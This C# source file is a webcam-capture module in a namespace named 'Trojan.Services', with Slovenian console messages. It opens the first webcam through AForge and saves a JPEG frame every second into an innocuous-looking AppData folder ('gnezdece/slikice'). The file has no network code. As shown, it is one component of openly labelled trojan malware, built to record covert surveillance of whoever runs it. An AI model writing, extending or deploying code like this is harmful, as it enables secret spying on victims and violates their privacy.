using AForge.Video;
using AForge.Video.DirectShow;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Timers;
using Timer = System.Timers.Timer;

namespace Trojan.Services
{
    public class WebcamService
    {
        private VideoCaptureDevice _videoSource;
        private FilterInfoCollection _videoDevices;
        private System.Timers.Timer _timer;
        private Bitmap _currentFrame;

        public void Start()
        {
            _videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

            if (_videoDevices.Count == 0)
            {
                throw new Exception("Webcam ni bila najdena.");
            }
            _videoSource = new VideoCaptureDevice(_videoDevices[0].MonikerString);
            _videoSource.NewFrame += VideoSource_NewFrame;
            _videoSource.Start();

            _timer = new Timer(1000);
            _timer.Elapsed += Timer_Elapsed;
            _timer.Start();

            Console.WriteLine("Webcam zagnana.");
        }

        private void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            _currentFrame?.Dispose();
            _currentFrame = (Bitmap)eventArgs.Frame.Clone();
        }

        private void Timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            if (_currentFrame == null)
                return;

            try
            {
                string folder = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "gnezdece",
                    "slikice"
                );

                if (!Directory.Exists(folder))
                    Directory.CreateDirectory(folder);

                string fileName = $"image_{DateTime.Now:yyyyMMdd_HHmmss}.jpg";
                string fullPath = Path.Combine(folder, fileName);

                _currentFrame.Save(fullPath, ImageFormat.Jpeg);

                Console.WriteLine($"Shranjeno: {fullPath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        public void Stop()
        {
            _timer?.Stop();

            if (_videoSource != null && _videoSource.IsRunning)
            {
                _videoSource.SignalToStop();
                _videoSource.WaitForStop();
            }

            _currentFrame?.Dispose();

            Console.WriteLine("Webcam ustavljena.");
        }
    }
}